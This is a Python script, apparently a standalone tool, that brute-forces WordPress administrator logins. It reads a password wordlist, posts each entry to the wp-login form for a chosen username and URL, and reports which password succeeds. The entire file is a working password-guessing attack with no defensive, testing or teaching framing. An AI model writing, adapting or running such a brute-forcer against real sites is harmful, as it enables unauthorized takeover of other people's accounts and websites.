from requests import Session
from threading import Thread
from colorama import Fore

class Brute:
    def __init__(self, password, user, url):
        self.url = url
        self.user = user
        self.passwords = password
        self.session = Session()
        self.response = self.session.get(self.url)
        if self.response.status_code == 200:
            print(Fore.GREEN + 'SUCCESSFUL CONNECTION' + Fore.RESET)
            self.pass_list()
            print(Fore.GREEN + 'START' + Fore.RESET)
            thread2 = Thread(target=self.request)
            thread2.start()
        else:
            print('Bad')

    def pass_list(self):
        self.arr = []
        if '.txt' in self.passwords:
            with open(self.passwords, 'r') as f:
                self.arr = [i.rstrip() for i in f]
            for i in range(len(self.arr)):
                try:
                    self.arr.remove('')
                    i += 1
                except:
                    i += 1
        else:
            self.arr.append(self.passwords)

    def request(self):
        self.post = {'log': self.user,
                     'pwd': '',
                     'wp-submit': 'Войти',
                     'redirect_to': 'wp-admin/',
                     'testcookie': '1'
                     }
        if len(self.arr) > 1:
            for i in range(len(self.arr)):
                self.post['pwd'] = self.arr[i]
                self.r = self.session.post(self.url, self.post)
                if 'login_error' in self.r.text:
                    print(self.arr[i] + Fore.RED + ': incorrect' + Fore.RESET)
                else:
                    print(self.arr[i] + Fore.GREEN + ': correct' + Fore.RESET)
                    break
        elif len(self.arr) == 1:
            self.post['pwd'] = self.arr[0]
            self.r = self.session.post(self.url, self.post)
            if 'login_error' in self.r.text:
                print(self.arr[0] + Fore.RED + ': incorrect' + Fore.RESET)
            else:
                print(self.arr[0] + Fore.GREEN + ': correct' + Fore.RESET)


if __name__ == '__main__':
    url = input('URL: ')
    user = input('Username: ')
    password = input('Password or list: ')
    Brute(password, user, url)
